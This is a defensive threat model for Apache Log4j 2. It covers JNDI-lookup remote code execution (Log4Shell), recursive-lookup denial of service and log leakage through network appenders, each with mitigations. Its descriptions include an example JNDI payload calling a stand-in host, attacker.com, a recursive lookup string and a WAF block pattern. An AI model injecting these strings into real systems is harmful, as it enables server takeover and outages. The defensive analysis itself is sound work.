# Threat Model Analysis for apache/logging-log4j2

## Threat: [Remote Code Execution (RCE) via JNDI Lookup](./threats/remote_code_execution__rce__via_jndi_lookup.md)

*   **Threat:** Remote Code Execution (RCE) via JNDI Lookup

    *   **Description:** An attacker crafts a malicious input (e.g., in an HTTP header, form field, or any data that gets logged) containing a JNDI lookup string like `${jndi:ldap://attacker.com/exploit}`.  Log4j 2, if configured to allow JNDI lookups, attempts to resolve this, contacting the attacker's server. The attacker's server responds with a malicious Java object, which Log4j 2 deserializes and executes, granting the attacker control over the server. This is the core of the Log4Shell vulnerability.

    *   **Impact:** Complete system compromise. The attacker can execute arbitrary code, steal data, install malware, pivot to other systems, and disrupt services.  Full control over the application and potentially the underlying operating system.

    *   **Affected Component:** `org.apache.logging.log4j.core.lookup.JndiLookup` class (within the `log4j-core` module).  The core issue is the handling of JNDI lookups within the message formatting process.

    *   **Risk Severity:** Critical

    *   **Mitigation Strategies:**
        *   **Upgrade:** *Immediately* upgrade to the latest patched version of Log4j 2 (check for the absolute latest release, as new vulnerabilities and patches may emerge). This is the *most important* mitigation.
        *   **Disable JNDI Lookups:** If upgrading is not immediately feasible, set the system property `log4j2.formatMsgNoLookups=true` (or the environment variable `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`).  This disables *all* lookups during message formatting, preventing the JNDI exploit. *Note: This may break functionality that relies on lookups.*
        *   **Restrict Outbound Connections:** Use firewall rules (at the network and host level) to block outbound connections from the application server, especially on ports commonly used by LDAP (389, 636), RMI (1099), and DNS (53). This limits the attacker's ability to deliver the malicious payload.
        *   **Input Validation (Defense in Depth):** While not a complete solution, validate and sanitize *all* user-supplied input *before* it is logged.  This can help prevent malicious strings from reaching Log4j 2.
        *   **WAF (Defense in Depth):** Use a Web Application Firewall (WAF) configured to block requests containing strings like `${jndi:`.  This is a supplementary measure, as attackers may find bypasses.

## Threat: [Denial of Service (DoS) via Recursive Lookup](./threats/denial_of_service__dos__via_recursive_lookup.md)

*   **Threat:** Denial of Service (DoS) via Recursive Lookup

    *   **Description:** An attacker provides input that triggers a recursive lookup within Log4j 2, such as `${${::-${::-$}}}`.  Even in patched versions, poorly configured or overly permissive lookup configurations can lead to a stack overflow or excessive resource consumption, causing the application to crash or become unresponsive.

    *   **Impact:** Application unavailability.  The application becomes unresponsive, preventing legitimate users from accessing it.

    *   **Affected Component:** `org.apache.logging.log4j.core.lookup.StrSubstitutor` class (within the `log4j-core` module). The issue is the handling of nested and potentially self-referential lookups.

    *   **Risk Severity:** High

    *   **Mitigation Strategies:**
        *   **Upgrade:** Upgrade to the latest patched version of Log4j 2. Patches address many recursive lookup vulnerabilities.
        *   **Limit Lookup Depth:** Configure Log4j 2 to limit the maximum depth of nested lookups. This prevents excessively deep recursion that can lead to stack overflows. This can often be configured within the `StrSubstitutor` itself.
        *   **Disable Unnecessary Lookups:** If lookups are not essential for the application's functionality, disable them entirely using `log4j2.formatMsgNoLookups=true`. If specific lookups are needed, carefully review and restrict which ones are enabled.
        *   **Input Validation:** Sanitize and validate all user-provided input before logging it to prevent malicious lookup strings.
        *   **Rate Limiting:** Implement rate limiting to prevent attackers from flooding the application with requests containing malicious lookups.

## Threat: [Unintended Network Connections from Appenders (leading to Information Disclosure)](./threats/unintended_network_connections_from_appenders__leading_to_information_disclosure_.md)

* **Threat:** Unintended Network Connections from Appenders (leading to Information Disclosure)

    * **Description:** Log4j 2 is configured to use a network-based appender (e.g., SocketAppender, SyslogAppender, JMSAppender) that sends log data to an unintended or malicious destination due to a misconfiguration or a compromised configuration file. This is a *direct* Log4j 2 configuration issue.

    * **Impact:**
        *   **Information Disclosure:** Log data, potentially containing sensitive information, is sent to an attacker-controlled server.

    * **Affected Component:** Network-based appenders within `log4j-core` and potentially other modules (e.g., `log4j-smtp`, `log4j-flume-ng`). Examples include:
        *   `org.apache.logging.log4j.core.appender.SocketAppender`
        *   `org.apache.logging.log4j.core.appender.SyslogAppender`
        *   `org.apache.logging.log4j.core.net.JMSAppender`

    * **Risk Severity:** High

    * **Mitigation Strategies:**
        * **Careful Configuration Review:** Thoroughly review the configuration of *all* network-based appenders. Double-check hostnames, ports, protocols, and any authentication credentials.
        * **Use Secure Protocols:** Use secure protocols (e.g., TLS/SSL) for network-based logging to encrypt log data in transit and authenticate the destination server.
        * **Firewall Rules:** Implement strict firewall rules to restrict outbound connections from the application server to only authorized logging destinations.
        * **Principle of Least Privilege:** Ensure that the application runs with the minimum necessary privileges. Avoid running the application as root or with excessive network permissions.
        * **Configuration Management:** Use a secure configuration management system to manage and deploy Log4j 2 configuration files, preventing unauthorized modifications.
        * **Monitor Network Traffic:** Monitor network traffic to detect any unexpected or unauthorized connections related to logging.

